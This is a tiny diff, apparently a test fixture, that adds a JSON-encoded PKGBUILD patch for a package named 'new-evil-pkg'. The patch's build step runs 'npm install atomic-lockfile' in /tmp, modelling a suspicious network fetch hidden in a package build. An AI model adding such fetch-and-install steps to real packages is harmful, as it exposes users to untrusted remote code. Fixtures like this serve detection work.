@@ -1,0 +1,1 @@
+{"files": [{"filename": "PKGBUILD", "patch": "@@ -0,0 +1,2 @@\n+pkgname=new-evil-pkg\n+  cd /tmp && npm install atomic-lockfile\n"}]}
